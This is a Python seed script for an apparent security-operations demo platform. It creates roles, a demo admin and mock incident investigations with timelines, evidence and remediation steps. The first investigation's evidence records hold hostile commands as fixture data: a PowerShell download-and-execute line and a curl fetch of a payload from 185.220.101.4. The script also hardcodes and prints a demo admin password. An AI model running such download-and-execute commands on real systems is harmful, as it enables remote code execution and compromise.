"""
Idempotent seed script — safe to run every startup. Creates:
  - the fixed permission set
  - the five baseline roles from the UI/UX spec, each mapped to permissions
  - a demo organization
  - one admin user (credentials printed to stdout on first run only)

Run with: `python -m app.seed.seed_data` (also invoked automatically by
docker-compose's backend entrypoint — see docker-compose.yml).
"""
import logging
from datetime import datetime, timedelta, timezone

from app.core.security import hash_password
from app.modules.identity.infrastructure.models import Organization, Permission, Role, User
from app.modules.investigations.infrastructure.models import (
    Evidence,
    EvidenceRecord,
    EvidenceType,
    Investigation,
    InvestigationStatus,
    RecommendedAction,
    Severity,
    TimelineEvent,
)
from app.modules.assets.infrastructure.models import Asset
from app.modules.assets.infrastructure.repository import AssetRepository
from app.modules.investigations.infrastructure.repository import IOCRepository
from app.shared.database import SessionLocal

logger = logging.getLogger(__name__)

# code -> human description
PERMISSIONS: dict[str, str] = {
    "investigation:read": "View investigations",
    "investigation:write": "Create and edit investigations",
    "investigation:approve_remediation": "Approve AI-recommended remediation actions",
    "reports:generate_executive": "Generate executive reports",
    "reports:generate_technical": "Generate technical reports",
    "attack_graph:read": "View the attack graph",
    "threat_intel:read": "View threat intelligence",
    "threat_intel:write": "Manage the TI watchlist",
    "settings:manage_connectors": "Manage data source connectors",
    "users:manage": "Invite users and manage roles",
    "analytics:read": "View analytics and risk heatmaps",
}

# role name -> (description, [permission codes])
ROLES: dict[str, tuple[str, list[str]]] = {
    "soc_analyst": (
        "Front-line triage of incoming investigations",
        ["investigation:read", "investigation:write", "attack_graph:read", "threat_intel:read", "analytics:read"],
    ),
    "incident_responder": (
        "Owns active incidents through containment and recovery",
        [
            "investigation:read", "investigation:write", "investigation:approve_remediation",
            "attack_graph:read", "threat_intel:read", "threat_intel:write",
            "reports:generate_technical", "analytics:read",
        ],
    ),
    "security_architect": (
        "Designs detections and reviews systemic risk",
        [
            "investigation:read", "attack_graph:read", "threat_intel:read",
            "reports:generate_technical", "analytics:read",
        ],
    ),
    "ciso": (
        "Executive oversight and reporting",
        [
            "investigation:read", "attack_graph:read", "threat_intel:read",
            "reports:generate_executive", "reports:generate_technical", "analytics:read",
        ],
    ),
    "admin": (
        "Full platform administration",
        list(PERMISSIONS.keys()),
    ),
}

DEMO_ORG_SLUG = "aegis-demo"
DEMO_ORG_NAME = "Aegis Demo Org"
DEMO_ADMIN_EMAIL = "admin@aegis.demo"
DEMO_ADMIN_PASSWORD = "ChangeMe123!"  # noqa: printed to console on seed, dev only

# Mock security events standing in for a real correlation/AI pipeline (see
# the module docstring in investigations/infrastructure/models.py). Each
# entry mirrors the shape a real ai_reasoning module would eventually
# produce, so the frontend/API contract doesn't change when v2 wires in
# real integrations.
MOCK_INVESTIGATIONS = [
    {
        "title": "Anomalous auth from new geo",
        "source": "Mock Identity Provider",
        "severity": Severity.CRITICAL,
        "status": InvestigationStatus.INVESTIGATING,
        "confidence": 92,
        "root_cause": (
            "Credential stuffing followed by session token reuse from an "
            "anonymized VPN exit node. The originating IP has no prior "
            "login history for this account and geolocates to a region "
            "the user has never authenticated from."
        ),
        "mitre_techniques": ["T1078", "T1550"],
        "blast_radius_summary": (
            "One compromised identity with access to the payments service "
            "account. No lateral movement detected yet."
        ),
        "false_positive_probability": 8,
        "hours_ago": 3,
        "attack_chain": [
            {"phase": "Initial Access", "description": "Valid credentials used from an unrecognized VPN exit node, likely obtained via credential stuffing."},
            {"phase": "Defense Evasion", "description": "MFA bypass attempted immediately after login, suggesting the attacker anticipated a second factor."},
            {"phase": "Persistence", "description": "Session token reused from a different IP than the original login, indicating the token itself was exfiltrated or replayed."},
        ],
        "alternative_hypotheses": [
            {"hypothesis": "The account owner is traveling and used a personal VPN service", "likelihood": 12},
            {"hypothesis": "A shared corporate VPN egress IP coincidentally matches a known exit node range", "likelihood": 6},
        ],
        "reasoning_chain": [
            "The login IP has zero prior history for this account across the identity provider's logs.",
            "That IP is a known Tor/VPN exit node associated with prior malicious activity (see IOC intelligence).",
            "An MFA bypass attempt occurring one minute after login is not consistent with normal user behavior.",
            "The same session token was reused from a second, different IP shortly after — tokens don't move between IPs on their own, which points to token theft rather than a benign travel scenario.",
        ],
        "evidence": [
            (EvidenceType.IP, "185.220.101.4"),
            (EvidenceType.HASH, "a91f3c...c02e"),
            (EvidenceType.ASSET, "svc-payments-01"),
        ],
        "timeline": [
            {"minutes_ago": 180, "description": "Login from Lagos, NG — first time seen for this account",
             "severity": Severity.MEDIUM, "mitre_technique": "T1078", "source": "Mock Identity Provider",
             "affected_asset": "okta-tenant-prod", "actor": "j.martinez@aegis-demo.example"},
            {"minutes_ago": 179, "description": "MFA bypass attempt detected",
             "severity": Severity.HIGH, "mitre_technique": "T1111", "source": "Mock Identity Provider",
             "affected_asset": "okta-tenant-prod", "actor": "j.martinez@aegis-demo.example"},
            {"minutes_ago": 176, "description": "Session token reused from a different IP over VPN",
             "severity": Severity.CRITICAL, "mitre_technique": "T1550", "source": "Mock Identity Provider",
             "affected_asset": "svc-payments-01", "actor": "185.220.101.4"},
        ],
        "actions": [
            {"title": "Revoke session token",
             "description": "Immediately invalidates the reused session token, forcing re-authentication.",
             "confidence": 95, "business_impact": "low",
             "side_effects": "The account owner's current session disconnects and they must log in again.",
             "rollback": "None needed — re-authenticating restores normal access immediately.",
             "estimated_time_to_contain": "Under 1 minute", "approval_tier": "SOC Tier 1"},
            {"title": "Force password reset",
             "description": "Requires the account owner to set a new password before next login.",
             "confidence": 88, "business_impact": "medium",
             "side_effects": "The user is locked out until they complete the reset flow, and any saved-password integrations break until updated.",
             "rollback": "Support can manually reset back to a temporary password if this disrupts a critical workflow.",
             "estimated_time_to_contain": "5-15 minutes", "approval_tier": "SOC Tier 2"},
        ],
        "evidence_records": [
            {"minutes_ago": 181, "category": "browser_history",
             "summary": "Chrome visited a password-reset link from a phishing email",
             "details": {"url": "http://185.220.101.4/reset-password", "browser": "Chrome",
                         "user": "j.martinez", "referrer": "webmail.aegis-demo.example"}},
            {"minutes_ago": 180, "category": "authentication",
             "summary": "Successful login from 185.220.101.4 using valid credentials",
             "details": {"username": "j.martinez@aegis-demo.example", "source_ip": "185.220.101.4",
                         "auth_method": "password", "mfa_used": False, "result": "success"}},
            {"minutes_ago": 179, "category": "network_connection",
             "summary": "Outbound HTTPS connection to unrecognized VPN exit node",
             "details": {"src_ip": "10.0.2.14", "dst_ip": "185.220.101.4", "dst_port": 443,
                         "protocol": "TCP", "bytes_sent": 45210}},
            {"minutes_ago": 178, "category": "process",
             "summary": "Suspicious PowerShell process spawned by the browser",
             "details": {"pid": 8842, "name": "powershell.exe", "parent_process": "chrome.exe",
                         "user": "j.martinez", "command_line": "-EncodedCommand JABzAD0A..."}},
            {"minutes_ago": 178, "category": "powershell",
             "summary": "Base64-encoded download-and-execute command run",
             "details": {"host": "WIN-J-MARTINEZ", "user": "j.martinez",
                         "script_block": "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.4/payload')"}},
            {"minutes_ago": 177, "category": "dns",
             "summary": "DNS query for a domain associated with known C2 infrastructure",
             "details": {"query": "update-cdn-service.net", "record_type": "A",
                         "response": "185.220.101.4", "resolver": "8.8.8.8"}},
            {"minutes_ago": 176, "category": "file",
             "summary": "Temporary executable dropped in the user's AppData folder",
             "details": {"path": "C:\\Users\\j.martinez\\AppData\\Local\\Temp\\svc_update.exe",
                         "hash": "a91f3c...c02e", "size_bytes": 245760, "action": "created"}},
            {"minutes_ago": 176, "category": "command_history",
             "summary": "curl used from cmd.exe to fetch the remote payload",
             "details": {"command": "curl -o svc_update.exe http://185.220.101.4/payload",
                         "shell": "cmd.exe", "user": "j.martinez"}},
            {"minutes_ago": 175, "category": "firewall",
             "summary": "Outbound connection allowed by the default egress rule",
             "details": {"rule": "ALLOW-ALL-OUTBOUND-443", "action": "allow",
                         "src": "10.0.2.14", "dst": "185.220.101.4:443"}},
        ],
    },
    {
        "title": "Privilege escalation on jump host",
        "source": "Mock EDR",
        "severity": Severity.HIGH,
        "status": InvestigationStatus.TRIAGING,
        "confidence": 78,
        "root_cause": (
            "A service account with unnecessarily broad sudo rights was used "
            "to add a new local admin user shortly after an unpatched "
            "vulnerability was disclosed for the host's OS version."
        ),
        "mitre_techniques": ["T1548", "T1136"],
        "blast_radius_summary": (
            "Jump host has network access to 14 internal services; no "
            "confirmed pivot yet."
        ),
        "false_positive_probability": 22,
        "hours_ago": 9,
        "attack_chain": [
            {"phase": "Privilege Escalation", "description": "Sudo rights on a service account were used to modify /etc/sudoers, broadening what that account can do."},
            {"phase": "Persistence", "description": "A new local admin account was created, giving a durable foothold independent of the original service account."},
        ],
        "alternative_hypotheses": [
            {"hypothesis": "A legitimate deployment script modified sudoers as part of routine automation", "likelihood": 25},
        ],
        "reasoning_chain": [
            "svc-deploy modifying /etc/sudoers is unusual — deployment accounts don't typically need to change their own privilege boundaries.",
            "A new local admin account appearing within 2 minutes of that change, created by the same actor, is consistent with an attacker establishing persistence rather than routine config drift.",
            "The timing coincides with a disclosed vulnerability for this host's OS version, which is a plausible initial-access vector worth correlating further.",
        ],
        "evidence": [
            (EvidenceType.ASSET, "jump-host-03"),
            (EvidenceType.HASH, "7bd4e1...9f21"),
        ],
        "timeline": [
            {"minutes_ago": 540, "description": "sudo rights used to modify /etc/sudoers",
             "severity": Severity.HIGH, "mitre_technique": "T1548", "source": "Mock EDR",
             "affected_asset": "jump-host-03", "actor": "svc-deploy"},
            {"minutes_ago": 538, "description": "New local admin user 'svc-temp' created",
             "severity": Severity.HIGH, "mitre_technique": "T1136", "source": "Mock EDR",
             "affected_asset": "jump-host-03", "actor": "svc-deploy"},
        ],
        "actions": [
            {"title": "Disable svc-temp account",
             "description": "Removes the newly created admin account pending review.",
             "confidence": 82, "business_impact": "medium",
             "side_effects": "Any process currently running as svc-temp will lose access immediately.",
             "rollback": "Re-enable the account if review confirms it was legitimately created by an approved deployment.",
             "estimated_time_to_contain": "2-5 minutes", "approval_tier": "SOC Tier 2"},
        ],
        "evidence_records": [
            {"minutes_ago": 539, "category": "registry",
             "summary": "New autorun entry added to the Run key",
             "details": {"hive": "HKLM", "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
                         "value_name": "SvcTemp", "value_data": "C:\\Windows\\Temp\\svc_temp.exe"}},
            {"minutes_ago": 537, "category": "authentication",
             "summary": "New local admin account logged in shortly after creation",
             "details": {"username": "svc-temp", "source_ip": "127.0.0.1",
                         "auth_method": "local", "result": "success"}},
        ],
    },
    {
        "title": "Unusual S3 bucket policy change",
        "source": "Mock Cloud Audit Log",
        "severity": Severity.MEDIUM,
        "status": InvestigationStatus.NEW,
        "confidence": 64,
        "root_cause": (
            "A bucket policy was modified to allow public read access. The "
            "change was made outside business hours by a role that hasn't "
            "modified bucket policies in the past 90 days."
        ),
        "mitre_techniques": ["T1578"],
        "blast_radius_summary": "One storage bucket, no evidence of data access yet.",
        "false_positive_probability": 35,
        "hours_ago": 14,
        "attack_chain": [
            {"phase": "Impact", "description": "A storage bucket's access policy was widened to allow public read access."},
        ],
        "alternative_hypotheses": [
            {"hypothesis": "A developer intentionally made the bucket public for a legitimate static-asset use case and simply didn't follow the change process", "likelihood": 40},
        ],
        "reasoning_chain": [
            "This role hasn't touched bucket policies in the last 90 days, so this is a break from its normal behavior pattern.",
            "The change happened outside business hours, which is atypical for routine infrastructure work by this team.",
            "No data access has been observed yet, which keeps this from being confirmed as an active breach — but the exposure itself is the risk regardless of whether it's been exploited.",
        ],
        "evidence": [
            (EvidenceType.ASSET, "s3://aegis-reports-prod"),
        ],
        "timeline": [
            {"minutes_ago": 840, "description": "Bucket policy modified to grant public read",
             "severity": Severity.MEDIUM, "mitre_technique": "T1578", "source": "Mock Cloud Audit Log",
             "affected_asset": "s3://aegis-reports-prod", "actor": "role/data-platform-ci"},
        ],
        "actions": [
            {"title": "Revert bucket policy",
             "description": "Restores the previous, non-public bucket policy.",
             "confidence": 90, "business_impact": "low",
             "side_effects": "Any external consumer currently relying on public access to this bucket will lose access immediately.",
             "rollback": "Re-apply the public policy if a legitimate use case is confirmed with the requesting team.",
             "estimated_time_to_contain": "Under 5 minutes", "approval_tier": "SOC Tier 1"},
        ],
    },
    {
        "title": "Repeated failed logins against admin console",
        "source": "Mock Identity Provider",
        "severity": Severity.LOW,
        "status": InvestigationStatus.RESOLVED,
        "confidence": 55,
        "root_cause": (
            "A misconfigured monitoring script was retrying authentication "
            "with a stale API key, producing a burst of failed logins that "
            "resembled a brute-force pattern."
        ),
        "mitre_techniques": ["T1110"],
        "blast_radius_summary": "No account compromise; source was an internal service.",
        "false_positive_probability": 81,
        "hours_ago": 30,
        "alternative_hypotheses": [
            {"hypothesis": "A genuine brute-force attempt against the admin console", "likelihood": 15},
        ],
        "reasoning_chain": [
            "The source IP (10.0.4.22) is an internal address, not external — brute-force attempts against an admin console from inside the network are far more often tooling bugs than actual attacks.",
            "The failure pattern (47 attempts in 5 minutes, then stopping) matches a retry loop with a fixed interval rather than the more varied timing typical of an actual credential-stuffing tool.",
            "Follow-up confirmed the source as an internal monitoring script using a stale API key — consistent with the retry-loop pattern observed.",
        ],
        "evidence": [
            (EvidenceType.IP, "10.0.4.22"),
        ],
        "timeline": [
            {"minutes_ago": 1800, "description": "47 failed login attempts within 5 minutes",
             "severity": Severity.LOW, "mitre_technique": "T1110", "source": "Mock Identity Provider",
             "affected_asset": "admin-console", "actor": "10.0.4.22"},
            {"minutes_ago": 1750, "description": "Identified as internal monitoring script",
             "severity": Severity.INFO, "mitre_technique": None, "source": "Mock Identity Provider",
             "affected_asset": "admin-console", "actor": "10.0.4.22"},
        ],
        "actions": [],
    },
]


# Asset registry entries — matches every affected_asset name already
# referenced in MOCK_INVESTIGATIONS' timeline events above, so the
# Attack Graph's asset nodes have real enrichment (risk score,
# criticality, health) to show instead of bare labels.
MOCK_ASSETS = [
    {
        "name": "okta-tenant-prod", "asset_type": "identity_provider", "os": None,
        "owner": "Identity Platform Team", "department": "IT", "criticality": "critical",
        "health": "at_risk", "risk_score": 78,
        "open_vulnerabilities": [], "installed_software": [], "running_services": ["SSO", "SCIM provisioning"],
        "security_controls": ["MFA enforced (partial rollout)", "Conditional access policies"],
        "cloud_tags": {"env": "production"},
    },
    {
        "name": "svc-payments-01", "asset_type": "host", "os": "Ubuntu 22.04",
        "owner": "Payments Team", "department": "Engineering", "criticality": "critical",
        "health": "compromised", "risk_score": 91,
        "open_vulnerabilities": [{"cve": "CVE-2024-3094", "severity": "critical"}],
        "installed_software": ["nginx 1.24", "postgresql-client 15"],
        "running_services": ["payments-api", "cron"],
        "security_controls": ["EDR agent", "Host firewall"],
        "cloud_tags": {"env": "production", "pci_scope": "true"},
    },
    {
        "name": "jump-host-03", "asset_type": "host", "os": "CentOS 7 (EOL)",
        "owner": "Platform Team", "department": "Engineering", "criticality": "high",
        "health": "at_risk", "risk_score": 82,
        "open_vulnerabilities": [{"cve": "CVE-2023-4911", "severity": "high"}],
        "installed_software": ["OpenSSH 7.4", "sudo 1.8.23"],
        "running_services": ["sshd"],
        "security_controls": ["EDR agent"],
        "cloud_tags": {"env": "production"},
    },
    {
        "name": "s3://aegis-reports-prod", "asset_type": "cloud_resource", "os": None,
        "owner": "Data Platform Team", "department": "Engineering", "criticality": "high",
        "health": "at_risk", "risk_score": 65,
        "open_vulnerabilities": [], "installed_software": [], "running_services": [],
        "security_controls": ["Bucket versioning", "Access logging"],
        "cloud_tags": {"env": "production", "data_classification": "internal"},
    },
    {
        "name": "admin-console", "asset_type": "host", "os": "Ubuntu 22.04",
        "owner": "IT Operations", "department": "IT", "criticality": "medium",
        "health": "healthy", "risk_score": 22,
        "open_vulnerabilities": [], "installed_software": ["nginx 1.24"], "running_services": ["admin-web"],
        "security_controls": ["EDR agent", "Rate limiting"],
        "cloud_tags": {"env": "production"},
    },
]


def seed_mock_assets(db, org_id) -> None:
    existing = db.query(Asset).filter_by(org_id=org_id).count()
    if existing > 0:
        print(f"[seed] {existing} asset(s) already exist — skipping.")
        return

    now = datetime.now(timezone.utc)
    repo = AssetRepository(db)
    for entry in MOCK_ASSETS:
        asset = repo.record_mention(org_id, entry["name"], seen_at=now)
        for field, value in entry.items():
            if field != "name":
                setattr(asset, field, value)
    db.flush()
    print(f"[seed] Created {len(MOCK_ASSETS)} assets.")


def seed_mock_investigations(db, org_id) -> None:
    existing = db.query(Investigation).filter_by(org_id=org_id).count()
    if existing > 0:
        print(f"[seed] {existing} mock investigation(s) already exist — skipping investigation creation.")
    else:
        _create_mock_investigations(db, org_id)

    # Curation is intentionally OUTSIDE the "investigations already exist"
    # guard above and re-runs every startup. It's a pure overwrite
    # (set_enrichment/set_watched), safe to reapply, and must not be
    # skipped just because investigation creation was skipped — an org
    # seeded under older code (before `verdict`/`is_watched` existed on
    # IOC) would otherwise keep those fields at their schema default
    # forever, even after upgrading, since investigation creation never
    # re-runs to trigger it. This was a real bug: 185.220.101.4 could show
    # correct confidence/tags/enrichment (set by an earlier seed pass)
    # alongside a stale, never-backfilled verdict of "unknown".
    _curate_seed_ioc_intelligence(db, org_id)


def _create_mock_investigations(db, org_id) -> None:
    now = datetime.now(timezone.utc)
    ioc_repo = IOCRepository(db)
    for entry in MOCK_INVESTIGATIONS:
        investigation = Investigation(
            org_id=org_id,
            title=entry["title"],
            source=entry["source"],
            severity=entry["severity"],
            status=entry["status"],
            confidence=entry["confidence"],
            root_cause=entry["root_cause"],
            mitre_techniques=entry["mitre_techniques"],
            blast_radius_summary=entry["blast_radius_summary"],
            false_positive_probability=entry["false_positive_probability"],
            attack_chain=entry.get("attack_chain", []),
            alternative_hypotheses=entry.get("alternative_hypotheses", []),
            reasoning_chain=entry.get("reasoning_chain", []),
            created_at=now - timedelta(hours=entry["hours_ago"]),
        )
        db.add(investigation)
        db.flush()

        for evidence_type, value in entry["evidence"]:
            db.add(Evidence(investigation_id=investigation.id, type=evidence_type, value=value))
            ioc_repo.record_sighting(org_id, evidence_type, value, seen_at=investigation.created_at)

        for event in entry["timeline"]:
            db.add(
                TimelineEvent(
                    investigation_id=investigation.id,
                    occurred_at=now - timedelta(minutes=event["minutes_ago"]),
                    description=event["description"],
                    severity=event.get("severity"),
                    mitre_technique=event.get("mitre_technique"),
                    source=event.get("source"),
                    affected_asset=event.get("affected_asset"),
                    actor=event.get("actor"),
                )
            )

        for action in entry["actions"]:
            db.add(
                RecommendedAction(
                    investigation_id=investigation.id,
                    title=action["title"],
                    description=action.get("description", ""),
                    confidence=action.get("confidence"),
                    business_impact=action.get("business_impact"),
                    side_effects=action.get("side_effects"),
                    rollback=action.get("rollback"),
                    estimated_time_to_contain=action.get("estimated_time_to_contain"),
                    approval_tier=action.get("approval_tier"),
                )
            )

        for record in entry.get("evidence_records", []):
            db.add(
                EvidenceRecord(
                    investigation_id=investigation.id,
                    category=record["category"],
                    occurred_at=now - timedelta(minutes=record["minutes_ago"]),
                    summary=record["summary"],
                    details=record["details"],
                )
            )

    db.flush()
    print(f"[seed] Created {len(MOCK_INVESTIGATIONS)} mock investigations.")


def _curate_seed_ioc_intelligence(db, org_id) -> None:
    # Manually curated enrichment for the one indicator worth calling out —
    # everything else stays at IOCRepository's honest default (unenriched,
    # confidence 50, verdict unknown) until a real threat-intel provider
    # (see enrichment_provider.py) exists to populate this automatically.
    # provenance="internal" here is a real correction, not cosmetic: this
    # was always a hand-curated value, never the result of an actual
    # external feed call, and the UI must never imply otherwise.
    ioc_repo = IOCRepository(db)
    tor_exit_node = ioc_repo.get_by_value(org_id, "ip", "185.220.101.4")
    if tor_exit_node is not None:
        ioc_repo.set_enrichment(
            tor_exit_node,
            tags=["tor-exit-node", "known-malicious"],
            confidence=92,
            verdict="malicious",
            provenance="internal",
            enrichment={
                "reputation": "malicious",
                "asn": "AS208294",
                "country": "NL",
                "classification": "Tor exit node",
            },
        )
        # Seeded as watched so the Watchlist tab and watchlist-match
        # ingest behavior have something real to show on a fresh demo
        # org, rather than starting permanently empty.
        ioc_repo.set_watched(tor_exit_node, True)

    db.flush()


def seed() -> None:
    db = SessionLocal()
    try:
        # --- Permissions ---
        existing_perms = {p.code: p for p in db.query(Permission).all()}
        for code, description in PERMISSIONS.items():
            if code not in existing_perms:
                perm = Permission(code=code, description=description)
                db.add(perm)
                existing_perms[code] = perm
        db.flush()

        # --- Roles ---
        existing_roles = {r.name: r for r in db.query(Role).all()}
        for role_name, (description, perm_codes) in ROLES.items():
            role = existing_roles.get(role_name)
            if role is None:
                role = Role(name=role_name, description=description)
                db.add(role)
                db.flush()
                existing_roles[role_name] = role
            role.permissions = [existing_perms[code] for code in perm_codes]
        db.flush()

        # --- Demo organization ---
        org = db.query(Organization).filter_by(slug=DEMO_ORG_SLUG).first()
        if org is None:
            org = Organization(name=DEMO_ORG_NAME, slug=DEMO_ORG_SLUG)
            db.add(org)
            db.flush()

        # --- Demo admin user ---
        admin_user = db.query(User).filter_by(org_id=org.id, email=DEMO_ADMIN_EMAIL).first()
        if admin_user is None:
            admin_user = User(
                org_id=org.id,
                role_id=existing_roles["admin"].id,
                email=DEMO_ADMIN_EMAIL,
                hashed_password=hash_password(DEMO_ADMIN_PASSWORD),
                full_name="Demo Administrator",
                is_active=True,
            )
            db.add(admin_user)
            db.flush()
            print(f"[seed] Created demo admin user: {DEMO_ADMIN_EMAIL} / {DEMO_ADMIN_PASSWORD}")
        else:
            print(f"[seed] Demo admin user already exists: {DEMO_ADMIN_EMAIL}")

        seed_mock_investigations(db, org.id)
        seed_mock_assets(db, org.id)

        db.commit()
        print("[seed] Seed complete.")
    except Exception:
        db.rollback()
        raise
    finally:
        db.close()


if __name__ == "__main__":
    seed()
